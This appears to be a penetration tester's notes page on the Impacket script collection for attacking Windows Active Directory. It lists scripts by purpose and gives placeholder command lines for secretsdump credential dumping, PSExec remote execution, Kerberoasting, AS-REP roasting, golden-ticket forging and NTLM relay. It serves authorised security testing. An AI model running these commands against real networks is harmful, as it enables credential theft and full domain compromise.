---
tags: [tool, privesc, windows, ad]
tool: "impacket-scripts"
category: "Privesc"
installed: true
phase: [all]
---

# Impacket Scripts - Windows Network Protocol Collection

## Tool Overview
Purpose: Collection of Python scripts for working with Windows network protocols
Location: /usr/bin/impacket-* scripts

## Key Scripts

### Credential Access
secretsdump.py - Dump secrets from Windows
lsadump.py - Dump LSA secrets
samrdump.py - Dump SAM

### Remote Execution
psexec.py - PSExec style execution
wmiexec.py - WMI execution
smbexec.py - SMB execution
atexec.py - Task scheduler execution
dcomexec.py - DCOM execution

### Kerberos
GetUserSPNs.py - Kerberoasting
GetNPUsers.py - AS-REP roasting
ticketer.py - Create golden/silver tickets
raiseChild.py - Child to parent domain attack

### Enumeration
lookupsid.py - SID brute force
rpcdump.py - RPC endpoint mapper
samrdump.py - SAM enumeration

### Relaying
ntlmrelayx.py - NTLM relay attacks

### Examples

SecretsDump:
impacket-secretsdump domain/user:pass@target

PSExec:
impacket-psexec domain/user:pass@target

Kerberoasting:
impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request

AS-REP Roasting:
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP

Golden Ticket:
impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain domain.local GoldenAdmin
export KRB5CCNAME=GoldenAdmin.ccache
impacket-psexec domain.local/GoldenAdmin@dc -k -no-pass

NTLM Relay:
impacket-ntlmrelayx -t ldap://dc.domain.local -smb2support

Lookup SIDs:
impacket-lookupsid domain/user:pass@target
